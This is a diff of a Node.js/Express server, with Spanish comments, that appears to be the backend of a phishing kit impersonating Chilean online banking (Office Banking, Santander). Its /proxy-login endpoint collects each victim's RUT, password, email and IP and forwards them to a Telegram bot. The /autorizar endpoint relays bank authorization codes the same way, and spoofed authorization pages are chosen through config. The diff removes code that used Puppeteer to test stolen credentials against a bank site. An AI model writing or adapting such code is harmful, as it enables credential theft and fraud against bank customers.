@@ -2,22 +2,59 @@ const express = require("express");
 const cors = require("cors");
 const fs = require("fs");
 const path = require("path");
-const puppeteer = require("puppeteer");
-// Si tu Node es <18, instala node-fetch y descomenta:
-// const fetch = require("node-fetch");
-
-// Host objetivo para el flujo de autenticación (configurable por env)
-const AUTH_SITE = process.env.AUTH_SITE || 'https://officebankchilempresas.com';
+// Eliminado Puppeteer y AUTH_SITE: ahora solo validamos RUT y gestionamos el flujo
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
 
+// Helper seguro para enviar mensajes a Telegram sin romper la ejecución
+async function safeSendTelegram(text) {
+  if (!process.env.TELEGRAM_TOKEN || !process.env.CHAT_ID) {
+    console.warn('Telegram no configurado: TELEGRAM_TOKEN o CHAT_ID faltante');
+    return;
+  }
+  try {
+    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text })
+    });
+  } catch (err) {
+    console.error('Error enviando a Telegram:', err);
+  }
+}
+
+// Validación de RUT chileno (server-side)
+function validarRut(rutCompleto) {
+  if (!rutCompleto || typeof rutCompleto !== 'string') return false;
+  rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
+  if (rutCompleto.length < 2) return false;
+  const cuerpo = rutCompleto.slice(0, -1);
+  const dv = rutCompleto.slice(-1);
+  if (!/^[0-9]+$/.test(cuerpo)) return false;
+
+  let suma = 0;
+  let multiplo = 2;
+  for (let i = cuerpo.length - 1; i >= 0; i--) {
+    suma += parseInt(cuerpo.charAt(i), 10) * multiplo;
+    multiplo = multiplo < 7 ? multiplo + 1 : 2;
+  }
+  let dvEsperado = 11 - (suma % 11);
+  dvEsperado = dvEsperado === 11 ? '0' : dvEsperado === 10 ? 'K' : dvEsperado.toString();
+  return dv === dvEsperado;
+}
+
 // Endpoint para leer configuración
 app.get("/config", (req, res) => {
-  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
-  res.json(cfg);
+  try {
+    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
+    res.json(cfg);
+  } catch (err) {
+    console.error('Error leyendo config.json:', err);
+    res.status(500).json({ error: 'Error leyendo configuración' });
+  }
 });
 
 // Endpoint para procesar saldo directamente (flujo original)
@@ -33,8 +70,13 @@ app.post("/procesarSaldo", async (req, res) => {
 
 // Endpoint para guardar configuración
 app.post("/config", (req, res) => {
-  fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
-  res.json(req.body);
+  try {
+    fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
+    res.json(req.body);
+  } catch (err) {
+    console.error('Error guardando config.json:', err);
+    res.status(500).json({ error: 'Error guardando configuración' });
+  }
 });
 
 // Ruta directa al admin
@@ -44,120 +86,61 @@ app.get("/admin", (req, res) => {
 
 // Decidir qué página de autorización mostrar
 app.get("/autorizacion", (req, res) => {
-  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
-
-  if (cfg.tipoAutorizacion === "santander") {
-    res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
-    return;
-  }
-
-  if (cfg.tipoAutorizacion === "coordenadas") {
+  try {
+    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
+    if (cfg.tipoAutorizacion === "santander") {
+      res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
+      return;
+    }
     res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
-    return;
+  } catch (err) {
+    console.error('Error leyendo config.json en /autorizacion:', err);
+    res.status(500).send('Error interno');
   }
-
-  res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
 });
 
 // Endpoint para recibir autorizaciones y reenviar a Telegram
 app.post("/autorizar", async (req, res) => {
   const mensaje = req.body.mensaje || "Autorización recibida";
   try {
-    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
-    });
+    await safeSendTelegram(mensaje);
     res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
   } catch (err) {
-    res.status(500).json({ status: "error", error: err.message });
+    console.error('Error en /autorizar:', err);
+    res.status(500).json({ status: "error", error: String(err) });
   }
 });
 
-// Endpoint para login → notifica ingreso y valida credenciales por respuesta de red
+// Endpoint para login → SIN Puppeteer: validar RUT y gestionar siguiente paso
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
   if (mail) {
     const mensaje = `Correo actualizado:\n${mail}\nIP: ${ip}`;
-    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
-    });
+    try { await safeSendTelegram(mensaje); } catch (e) { console.error(e); }
     return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
   }
 
-  // Notificación básica de ingreso (flujo original)
-  const ingresoMsg = `Login recibido AutOB:\nRUT: ${rut}\nClave: ${passwd}\nIP: ${ip}`;
-  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: ingresoMsg })
-  });
-
-  let mensajeFinal = "Bienvenido a Office Banking";
-
-  try {
-    if (rut && passwd) {
-      const browser = await puppeteer.launch({ headless: true });
-      const page = await browser.newPage();
-
-      let loginStatus = null;
-
-      // Escuchar respuestas de red
-      page.on('response', async (response) => {
-        const url = response.url();
-        if (url.includes('/login')) {
-          const status = response.status();
-          console.log("➡️ Respuesta de login:", status, url);
-
-          if (status === 401) loginStatus = 'error';
-          else if (status === 200) loginStatus = 'ok';
-        }
-      });
-
-      // Ir al sitio objetivo (configurable por AUTH_SITE)
-      console.log(`Navegando a sitio de autenticación: ${AUTH_SITE}`);
-      await page.goto(AUTH_SITE, { waitUntil: 'networkidle2' });
-      await page.waitForSelector('iframe');
-      const frameHandle = await page.$('iframe');
-      const frame = await frameHandle.contentFrame();
-
-      if (frame) {
-        await frame.type('#username', rut);
-        await frame.type('#password', passwd);
-        await frame.click('#doLoginButton');
-
-        // Esperar unos segundos a que llegue la respuesta
-        await page.waitForTimeout(4000);
-
-        if (loginStatus === 'error') {
-          mensajeFinal = "Credenciales incorrectas";
-          await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "❌ Credenciales incorrectas en OfficeBanking" })
-          });
-        } else if (loginStatus === 'ok') {
-          mensajeFinal = "Credenciales correctas";
-          await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "✅ Credenciales correctas en OfficeBanking" })
-          });
-        }
-      }
-
-      await browser.close();
-    }
-  } catch (err) {
-    console.error("⚠️ Error en validación de credenciales:", err);
-    mensajeFinal = "Bienvenido a Office Banking"; // flujo sigue igual
+  if (!rut || !passwd) {
+    return res.status(400).json({ status: "error", mensaje: "Faltan rut o contraseña" });
   }
 
-  res.json({ status: "ok", mensaje: mensajeFinal });
+  // Validar formato RUT
+  const rutValido = validarRut(rut);
+  if (!rutValido) {
+    // No intentamos validar contra OfficeBanking: solo verificamos formato
+    await safeSendTelegram(`Intento con RUT inválido:\nRUT: ${rut}\nIP: ${ip}`);
+    return res.status(400).json({ status: "invalid_rut", mensaje: "RUT inválido" });
+  }
+
+  // Notificación básica de ingreso
+  const ingresoMsg = `Login recibido AutOB:\nRUT: ${rut}\nClave: ${passwd}\nIP: ${ip}`;
+  try { await safeSendTelegram(ingresoMsg); } catch (e) { console.error(e); }
+
+  // Responder indicando que RUT es válido y cuál es el siguiente paso
+  // El frontend gestiona el flujo: pantalla de espera -> formulario correo -> productos -> autorizaciones
+  res.json({ status: "ok", mensaje: "RUT válido. Procede al siguiente paso.", siguiente: "correo" });
 });
 
 // Servir index.html por defecto
